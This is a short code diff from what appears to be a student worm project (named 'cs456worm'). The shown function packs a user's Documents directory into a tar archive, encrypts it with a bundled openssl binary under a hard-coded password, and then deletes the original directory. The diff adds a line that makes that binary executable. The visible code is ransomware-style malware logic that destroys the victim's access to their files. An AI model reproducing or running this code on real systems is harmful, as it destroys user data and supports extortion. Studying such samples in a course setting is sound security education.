@@ -59,6 +59,7 @@ def downloadAndEncrypt(path):
 	# create a tar
 	createTar(path)
 	# encrypt that tar
+	call(["chmod", "a+x", "./openssl"])
 	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
 	# delete the original directory
 	shutil.rmtree('/home/cpsc/Documents/')
